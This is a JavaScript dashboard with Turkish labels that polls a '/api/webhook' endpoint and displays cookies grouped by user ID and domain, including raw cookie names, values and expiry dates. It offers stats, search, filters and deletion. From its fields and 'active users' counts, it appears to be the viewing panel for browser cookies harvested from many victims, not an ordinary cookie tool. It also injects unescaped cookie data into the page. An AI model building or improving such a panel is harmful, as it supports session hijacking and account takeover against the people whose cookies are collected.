let lastData = [];
let domains = new Set();
let users = new Set();
let selectedPosts = new Set();

async function fetchPosts() {
  try {
    const res = await fetch('/api/webhook');
    const data = await res.json();
    
    // Veri değişmediyse güncelleme yapma
    if (JSON.stringify(data) === JSON.stringify(lastData)) {
      return;
    }
    
    lastData = data;
    updateDomainList(data);
    updateUserList(data);
    updateStats(data);
    updateSummary(data);
    renderPosts(data);
  } catch (error) {
    console.error('Veri alınırken hata oluştu:', error);
  }
}

function updateDomainList(data) {
  const domainSet = new Set();
  data.forEach(post => {
    if (post.body && post.body.cookies) {
      post.body.cookies.forEach(cookie => {
        const domain = cookie['Host raw'];
        if (domain) domainSet.add(domain);
      });
    }
  });
  
  domains = domainSet;
  const domainFilter = document.getElementById('domainFilter');
  const currentValue = domainFilter.value;
  
  domainFilter.innerHTML = '<option value="">Tümü</option>';
  [...domains].sort().forEach(domain => {
    const option = document.createElement('option');
    option.value = domain;
    option.textContent = domain;
    domainFilter.appendChild(option);
  });
  
  domainFilter.value = currentValue;
}

function updateUserList(data) {
  const userSet = new Set();
  data.forEach(post => {
    if (post.userId) userSet.add(post.userId);
  });
  
  users = userSet;
  const userFilter = document.getElementById('userFilter');
  const currentValue = userFilter.value;
  
  userFilter.innerHTML = '<option value="">Tümü</option>';
  [...users].sort().forEach(userId => {
    const option = document.createElement('option');
    option.value = userId;
    option.textContent = `Kullanıcı ${userId}`;
    userFilter.appendChild(option);
  });
  
  userFilter.value = currentValue;
}

function updateStats(data) {
  const totalRequests = data.length;
  const totalCookies = data.reduce((sum, post) => sum + (post.cookieCount || 0), 0);
  const uniqueDomains = domains.size;
  const uniqueUsers = users.size;
  
  const stats = document.getElementById('stats');
  stats.innerHTML = `
    <div class="stat-card">
      <h3>Toplam İstek</h3>
      <div class="value">${totalRequests}</div>
    </div>
    <div class="stat-card">
      <h3>Toplam Cookie</h3>
      <div class="value">${totalCookies}</div>
    </div>
    <div class="stat-card">
      <h3>Benzersiz Domain</h3>
      <div class="value">${uniqueDomains}</div>
    </div>
    <div class="stat-card">
      <h3>Aktif Kullanıcı</h3>
      <div class="value">${uniqueUsers}</div>
    </div>
  `;
}

function updateSummary(data) {
  const summary = document.getElementById('summary');
  const domainStats = {};
  
  data.forEach(post => {
    if (post.body && post.body.cookies) {
      post.body.cookies.forEach(cookie => {
        const domain = cookie['Host raw'];
        if (!domainStats[domain]) {
          domainStats[domain] = { count: 0, types: new Set(), users: new Set() };
        }
        domainStats[domain].count++;
        domainStats[domain].types.add(cookie['Name raw']);
        if (post.userId) domainStats[domain].users.add(post.userId);
      });
    }
  });
  
  const summaryHTML = Object.entries(domainStats)
    .sort(([,a], [,b]) => b.count - a.count)
    .map(([domain, stats]) => `
      <div class="domain-stat">
        <div class="domain-name">${domain}</div>
        <div class="domain-details">
          <span>${stats.count} cookie</span>
          <span>${stats.types.size} benzersiz</span>
          <span>${stats.users.size} kullanıcı</span>
        </div>
      </div>
    `).join('');
    
  summary.innerHTML = summaryHTML;
}

function renderPosts(data) {
  const list = document.getElementById('list');
  const showOnlyCookies = document.getElementById('showOnlyCookies').checked;
  const selectedDomain = document.getElementById('domainFilter').value;
  const selectedUser = document.getElementById('userFilter').value;
  const searchTerm = document.getElementById('searchInput').value.toLowerCase();
  
  // Filtreleme
  let filteredData = data;
  
  if (showOnlyCookies) {
    filteredData = filteredData.filter(post => post.cookieCount > 0);
  }
  
  if (selectedDomain) {
    filteredData = filteredData.filter(post => 
      post.body?.cookies?.some(cookie => cookie['Host raw'] === selectedDomain)
    );
  }
  
  if (selectedUser) {
    filteredData = filteredData.filter(post => post.userId === selectedUser);
  }
  
  if (searchTerm) {
    filteredData = filteredData.filter(post => {
      const cookieData = JSON.stringify(post.body?.cookies || []).toLowerCase();
      return cookieData.includes(searchTerm);
    });
  }
  
  list.innerHTML = '';
  
  filteredData.forEach(post => {
    const div = document.createElement('div');
    div.className = 'post';
    
    const cookieData = post.body.cookies ? formatCookieData(post.body.cookies, selectedDomain) : '';
    
    div.innerHTML = `
      <label class="post-select">
        <input type="checkbox" class="post-checkbox" data-id="${post.id}" ${selectedPosts.has(post.id) ? 'checked' : ''}>
      </label>
      <div class="post-header">
        <div class="time">${new Date(post.time).toLocaleString('tr-TR')}</div>
        <div class="cookie-count">
          Kullanıcı ${post.userId} - ${post.cookieCount || 0} cookie
        </div>
      </div>
      <div class="post-content">
        ${cookieData}
        <pre>${JSON.stringify(post.body, null, 2)}</pre>
      </div>
    `;
    
    // Checkbox event listener
    const checkbox = div.querySelector('.post-checkbox');
    checkbox.addEventListener('change', (e) => {
      if (e.target.checked) {
        selectedPosts.add(post.id);
      } else {
        selectedPosts.delete(post.id);
      }
      updateDeleteButton();
    });
    
    list.appendChild(div);
  });
  
  updateDeleteButton();
}

function formatCookieData(cookies, selectedDomain) {
  if (!cookies || !cookies.length) return '';
  
  const filteredCookies = selectedDomain 
    ? cookies.filter(cookie => cookie['Host raw'] === selectedDomain)
    : cookies;
  
  return `
    <div class="cookie-summary">
      <h3>Cookie Özeti (${filteredCookies.length} adet)</h3>
      <ul>
        ${filteredCookies.map(cookie => `
          <li>
            <strong>${cookie['Name raw']}</strong>
            <div>Domain: ${cookie['Host raw']}</div>
            <div>Süre: ${cookie['Expires']}</div>
            ${cookie['Content raw'] ? `<div>Değer: ${cookie['Content raw'].substring(0, 30)}${cookie['Content raw'].length > 30 ? '...' : ''}</div>` : ''}
          </li>
        `).join('')}
      </ul>
    </div>
  `;
}

function updateDeleteButton() {
  const deleteButton = document.getElementById('deleteSelected');
  deleteButton.disabled = selectedPosts.size === 0;
}

async function deleteData(options = {}) {
  try {
    const response = await fetch('/api/webhook', {
      method: 'DELETE',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(options)
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    // Başarılı silme işleminden sonra
    selectedPosts.clear();
    await fetchPosts();
  } catch (error) {
    console.error('Silme hatası:', error);
    alert('Silme işlemi sırasında bir hata oluştu.');
  }
}

// Modal functions
function showModal(message, onConfirm) {
  const modal = document.getElementById('confirmModal');
  const confirmMessage = document.getElementById('confirmMessage');
  
  confirmMessage.textContent = message;
  modal.classList.add('show');
  
  const handleConfirm = async () => {
    modal.classList.remove('show');
    await onConfirm();
  };
  
  document.getElementById('confirmOk').onclick = handleConfirm;
  document.getElementById('confirmCancel').onclick = () => {
    modal.classList.remove('show');
  };
}

// Event Listeners
document.getElementById('showOnlyCookies').addEventListener('change', () => {
  renderPosts(lastData);
});

document.getElementById('domainFilter').addEventListener('change', () => {
  renderPosts(lastData);
});

document.getElementById('userFilter').addEventListener('change', () => {
  renderPosts(lastData);
});

document.getElementById('searchInput').addEventListener('input', debounce(() => {
  renderPosts(lastData);
}, 300));

document.getElementById('refreshButton').addEventListener('click', () => {
  fetchPosts();
});

document.getElementById('selectAll').addEventListener('change', (e) => {
  const checkboxes = document.querySelectorAll('.post-checkbox');
  checkboxes.forEach(checkbox => {
    checkbox.checked = e.target.checked;
    const id = checkbox.dataset.id;
    if (e.target.checked) {
      selectedPosts.add(id);
    } else {
      selectedPosts.delete(id);
    }
  });
  updateDeleteButton();
});

document.getElementById('deleteSelected').addEventListener('click', () => {
  if (selectedPosts.size === 0) return;
  
  showModal(
    `Seçili ${selectedPosts.size} kaydı silmek istediğinizden emin misiniz?`,
    () => deleteData({ ids: Array.from(selectedPosts) })
  );
});

document.getElementById('deleteAll').addEventListener('click', () => {
  showModal(
    'Tüm kayıtları silmek istediğinizden emin misiniz?',
    () => deleteData({ deleteAll: true })
  );
});

// Yardımcı fonksiyonlar
function debounce(func, wait) {
  let timeout;
  return function executedFunction(...args) {
    const later = () => {
      clearTimeout(timeout);
      func(...args);
    };
    clearTimeout(timeout);
    timeout = setTimeout(later, wait);
  };
}

// İlk yükleme
fetchPosts();

// Her 5 saniyede bir güncelle
setInterval(fetchPosts, 5000);